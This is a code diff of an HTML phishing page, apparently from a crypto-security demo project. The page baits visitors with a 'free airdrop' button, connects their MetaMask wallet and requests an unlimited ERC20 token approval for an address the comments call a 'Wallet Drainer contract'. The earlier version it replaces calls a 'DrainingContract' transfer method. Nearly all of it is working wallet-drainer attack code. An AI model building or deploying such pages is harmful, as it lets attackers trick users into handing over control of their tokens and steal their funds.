@@ -1,65 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; connect-src 'self' https://data-seed-prebsc-1-s1.binance.org:8545">
-    <title>Phishing Test Page</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSO to the moon</title>
 </head>
 <body>
-    <h2>Claim Your Free Airdrop!</h2>
-    <p>Click the button below to receive your reward.</p>
-    <button onclick="triggerPhishing()">Claim Now</button>
+    <h1>SSO to the moon</h1>
+    <!-- Connect button to request account -->
+    <button id="connectButton">Click me to connect your wallet</button>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <!-- Approve button to approve tokens for spending -->
+    <button id="approveButton">Get your free airdrop</button>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
     <script>
-        let web3;
-        let phishingContract;
-        const contractAddress = "0x271db605d24545f9194905A915Ca5d3fEc618936"; // Replace with your actual contract address
-        const contractABI = [ /* ABI of the DrainingContract */ ]; // Replace this with the actual ABI
+        let account;
 
-        async function connectMetaMask() {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
+        // Connect Button Event Listener
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            // Check if MetaMask is installed
+            if (typeof window.ethereum !== 'undefined') {
+                console.log('MetaMask is installed!');
+                
+                // Request accounts from MetaMask
                 try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    console.log("MetaMask connected successfully!");
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    account = accounts[0]; // Save the connected account
+                    console.log('Connected account:', account);
+                    alert(`Connected account: ${account}`);
                 } catch (error) {
-                    console.error("User denied account access:", error);
+                    console.error('User rejected connection or error occurred:', error);
                 }
             } else {
-                alert("MetaMask is not installed. Please install it to continue.");
+                alert('MetaMask is not installed!');
+            }
+        });
+
+        // The ERC20 token contract address (replace with your token's contract address)
+        const tokenAddress = '0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F';
+
+        // The Wallet Drainer contract address (replace with your drainer contract address)
+        const spenderAddress = '0xc68fA1a15992CDB03114D6ac9d7066A8e712A885';
+
+        // The maximum approval amount (for unlimited allowance)
+        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+        async function approveTokens() {
+            // Check if MetaMask is installed
+            if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
+
+                if (!account) {
+                    alert('Please connect your wallet first.');
+                    return;
+                }
+
+                // ABI for the ERC20 approve function
+                const approveAbi = [
+                    {
+                        constant: false,
+                        inputs: [
+                            { name: "_spender", type: "address" },
+                            { name: "_value", type: "uint256" }
+                        ],
+                        name: "approve",
+                        outputs: [{ name: "", type: "bool" }],
+                        type: "function"
+                    }
+                ];
+
+                // Create a contract instance
+                const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);
+
+                // Send the approve transaction
+                try {
+                    await tokenContract.methods
+                        .approve(spenderAddress, maxApproval)
+                        .send({ from: account });
+
+                    alert('Token approval successful!');
+                } catch (error) {
+                    alert('Error in token approval: ' + error.message);
+                }
+            } else {
+                alert('MetaMask is not installed!');
             }
         }
 
-        async function initializeContract() {
-            phishingContract = new web3.eth.Contract(contractABI, contractAddress);
-        }
-
-        async function triggerPhishing() {
-            if (!phishingContract) {
-                console.error("Contract not initialized. Initializing now...");
-                await connectMetaMask();
-                await initializeContract();
-            }
-
-            const accounts = await web3.eth.getAccounts();
-            const userAccount = accounts[0];
-
-            phishingContract.methods.approveAndTransfer("0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F").send({ from: userAccount })
-                .on('transactionHash', function(hash) {
-                    console.log('Transaction sent: ', hash);
-                })
-                .on('confirmation', function(confirmationNumber, receipt) {
-                    console.log('Transaction confirmed: ', confirmationNumber, receipt);
-                })
-                .on('error', function(error) {
-                    console.error('Transaction failed: ', error);
-                });
-        }
-
-        window.onload = async function () {
-            await connectMetaMask();
-            await initializeContract();
-        }
+        // Set up the Approve Button event listener
+        document.getElementById('approveButton').addEventListener('click', approveTokens);
     </script>
 </body>
 </html>
